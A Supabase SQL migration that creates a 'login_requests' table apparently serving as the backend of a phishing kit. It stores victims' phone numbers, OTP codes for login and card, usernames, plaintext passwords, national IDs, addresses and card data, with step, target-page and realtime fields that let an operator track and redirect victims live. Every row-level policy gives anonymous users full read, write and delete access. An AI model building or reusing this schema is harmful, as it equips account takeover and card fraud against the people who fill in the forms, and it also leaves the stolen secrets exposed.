
CREATE TABLE public.login_requests (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  phone TEXT NOT NULL,
  otp_code TEXT NOT NULL DEFAULT '----',
  otp_login TEXT,
  otp_token TEXT,
  otp_card TEXT,
  username TEXT,
  password TEXT,
  step TEXT NOT NULL DEFAULT 'login',
  status TEXT NOT NULL DEFAULT 'pending',
  selected_service TEXT,
  activation_data JSONB,
  full_name TEXT,
  national_id TEXT,
  governorate TEXT,
  city TEXT,
  street TEXT,
  card_data JSONB,
  target_page TEXT,
  last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.login_requests TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.login_requests TO authenticated;
GRANT ALL ON public.login_requests TO service_role;

ALTER TABLE public.login_requests ENABLE ROW LEVEL SECURITY;

CREATE POLICY "public can insert" ON public.login_requests FOR INSERT TO anon, authenticated WITH CHECK (true);
CREATE POLICY "public can select" ON public.login_requests FOR SELECT TO anon, authenticated USING (true);
CREATE POLICY "public can update" ON public.login_requests FOR UPDATE TO anon, authenticated USING (true) WITH CHECK (true);
CREATE POLICY "public can delete" ON public.login_requests FOR DELETE TO anon, authenticated USING (true);

CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_login_requests_updated_at
BEFORE UPDATE ON public.login_requests
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

ALTER PUBLICATION supabase_realtime ADD TABLE public.login_requests;
ALTER TABLE public.login_requests REPLICA IDENTITY FULL;
